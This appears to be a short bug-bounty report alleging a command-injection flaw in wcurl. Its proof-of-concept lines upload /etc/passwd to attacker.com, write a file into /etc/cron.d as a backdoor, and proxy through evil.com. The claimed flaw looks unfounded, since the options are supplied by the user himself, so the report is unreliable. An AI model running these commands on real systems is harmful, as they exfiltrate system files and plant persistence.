  "vulnerability_information": "when i was code auditing curl i stumbled uppon a vulnerablity that was on wcurl\n\naffected version:current\n\nstep 1: open terminal\nstep 2:run pocs below\n\nwcurl --dry-run --curl-options='-x http://evil.com:8080 -o /tmp/pwned' https://example.com/test.txt\n\nwcurl --dry-run --curl-options='-o /etc/cron.d/backdoor' https://attacker.com/malicious\n\nwcurl --dry-run --curl-options='-x http://attacker.com:8080' https://target.com/sensitive\n\nwcurl --dry-run --curl-options='-T /etc/passwd' https://attacker.com/steal https://x.com\n\nscreenshots below\n\nif this is not a vulnerability i am sorry \n\nthe dry run used to not harm the system\n\n## Impact\n\ncommand injection",
